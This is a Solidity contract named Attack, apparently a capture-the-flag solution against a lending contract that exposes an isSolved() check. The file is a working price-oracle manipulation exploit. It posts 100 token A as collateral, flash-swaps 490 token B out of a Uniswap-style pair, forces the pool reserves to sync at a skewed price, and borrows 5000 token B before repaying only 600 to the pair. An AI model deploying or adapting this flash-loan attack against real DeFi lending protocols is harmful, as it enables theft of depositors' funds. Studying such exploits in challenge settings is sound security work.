// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Lending {
    function addCollateral(uint256 amount) external;

    function removeCollateral(uint256 amount) external;

    function borrow(uint256 _amount) external;

    function repay(uint256 _amount) external;

    function getExchangeRate() external view returns (uint256);

    function isSolved() external view returns (bool);

    function collateralToken() external view returns (address);
    function borrowToken() external view returns (address);
    function pair() external view returns (address);
    function usersCollateral(address user) external view returns (uint256);
    function usersUsedCollateral(address user) external view returns (uint256);
    function usersBorrowed(address user) external view returns (uint256);
}

interface Pair {
    function getReserves()
        external
        view
        returns (
            uint112 _reserve0,
            uint112 _reserve1,
            uint32 _blockTimestampLast
        );

    function getSpotPrice() external view returns (uint256);

    function initialize(address _token0, address _token1) external;

    function mint(address to) external returns (uint liquidity);

    function burn(address to) external returns (uint amount0, uint amount1);

    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract Attack {
    address payable owner;
    Lending lending;
    Pair pair;
    IERC20 token0;
    IERC20 token1;

    constructor(address owner_, address lending_) {
        owner = payable(owner_);
        lending = Lending(lending_);

        pair = Pair(lending.pair());

        token0 = IERC20(lending.collateralToken());
        token1 = IERC20(lending.borrowToken());
    }

    function attack() public {
        require(msg.sender == owner);
        require(token0.balanceOf(address(this)) == 100 * 1e18);

        // add 100 token A as supply
        token0.approve(address(lending), 100 * 1e18);
        lending.addCollateral(100 * 1e18);
        // flash swap 490 tokens B. Pool: 10B / 500A
        pair.swap(0, 490 * 1e18, address(this), bytes("New Year 2025"));
    }

    function uniswapV2Call(
        address to,
        uint256 amount0Out,
        uint256 amount1Out,
        bytes calldata data
    ) public {
        require(msg.sender == address(pair), "Sender not pair");
        require(amount1Out == 490 * 1e18, "Amount1Out");
        // sync reserves with balances
        pair.sync();
        (uint112 _reserve0, uint112 _reserve1, ) = pair.getReserves();
        require(_reserve0 == 500 * 1e18, "Reserve0");
        require(_reserve1 == 10 * 1e18, "Reserve1");

        // borrow 5000 tokens B for 100 tokens A due to manipulated pool reserves
        lending.borrow(5000 * 1e18);
        uint256 token1Balance = token1.balanceOf(address(this));
        require(token1Balance == 5490 * 1e18, "Token1Balance");

        // return flash borrowed tokens B
        token1.transfer(address(pair), 600 * 1e18);
        pair.sync();
    }

    function getLendingAddress() external view returns (address) {
        return address(lending);
    }

    function getPairAddress() external view returns (address) {
        return address(pair);
    }

    function getToken0Address() external view returns (address) {
        return address(token0);
    }

    function getToken1Address() external view returns (address) {
        return address(token1);
    }
}
